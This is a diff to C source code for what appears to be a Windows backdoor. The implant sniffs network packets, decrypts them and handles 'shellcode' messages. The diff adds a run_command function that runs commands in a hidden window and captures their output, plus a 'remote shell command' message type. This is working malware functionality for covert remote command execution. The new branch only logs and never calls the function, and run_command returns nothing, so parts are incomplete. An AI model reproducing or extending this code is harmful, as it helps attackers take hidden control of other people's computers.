@@ -93,6 +93,57 @@ uint32_t sniffer_loop(SOCKET *s) {
    }
 }
 
+/*
+*  Most of this is from the MSDN
+*  https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx
+*/
+uint32_t run_command(const uint8_t *cmd, uint8_t *buffer, uint32_t buffer_size) {
+   HANDLE hChildStd_OUT_Rd = NULL;
+   HANDLE hChildStd_OUT_Wr = NULL;
+   SECURITY_ATTRIBUTES saAttr; 
+   PROCESS_INFORMATION procInf;
+   STARTUPINFOA startInf;
+   DWORD dwErr = 0, dwRead = 0, dwWritten = 0;
+
+   ZeroMemory(&startInf,   sizeof(STARTUPINFO));
+   ZeroMemory(&saAttr,     sizeof(SECURITY_ATTRIBUTES));
+   ZeroMemory(&procInf,    sizeof(PROCESS_INFORMATION));
+
+   saAttr.nLength =              sizeof(SECURITY_ATTRIBUTES); 
+   saAttr.bInheritHandle =       TRUE; 
+   saAttr.lpSecurityDescriptor = NULL; 
+
+   if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) {
+      LOG_ERROR("Failed to create stdout pipe");
+      return 0;
+   }
+   if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
+      LOG_ERROR("Failed to set stdout pipe");
+      return 0;
+   }
+
+   startInf.cb =           sizeof(STARTUPINFO); 
+   startInf.hStdError =    hChildStd_OUT_Wr;
+   startInf.hStdOutput =   hChildStd_OUT_Wr;
+   startInf.dwFlags |=     STARTF_USESTDHANDLES;
+ 
+   if(CreateProcessA(NULL, (char *)cmd, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf)) {
+      WaitForSingleObject( procInf.hProcess, INFINITE );
+      GetExitCodeProcess(procInf.hProcess, &dwErr );
+      CloseHandle(procInf.hProcess);
+      CloseHandle(procInf.hThread);
+
+      if(!ReadFile(hChildStd_OUT_Rd, buffer, buffer_size, &dwRead, NULL)) {
+         LOG_ERROR("Failed to read output from command: %s", cmd);
+      }
+   } else {
+      LOG_ERROR("Failed to execute command %s with error code 0x%08x", cmd, GetLastError());
+   }
+
+   CloseHandle(hChildStd_OUT_Wr);
+   CloseHandle(hChildStd_OUT_Rd);
+}
+
 uint32_t process_packet(const uint8_t *buffer, uint32_t len) {
    uint8_t *decrypted_data;
    struct in_addr source_address;
@@ -133,6 +184,8 @@ uint32_t process_packet(const uint8_t *buffer, uint32_t len) {
                   LOG_DEBUG("Received Windows shellcode message from %s", inet_ntoa(source_address));
                } else if(decrypted_data[6] & MESSAGE_REMOTE_SHELLCODE) {
                   LOG_DEBUG("Received Windows remote shellcode message from %s", inet_ntoa(source_address));
+               } else if(decrypted_data[6] & MESSAGE_COMMAND) {
+                  LOG_DEBUG("Recevied Windows remote shell command from %s", inet_ntoa(source_address));
                } else {
                   LOG_DEBUG("Received an unknown Windows message from %s", inet_ntoa(source_address));
                }
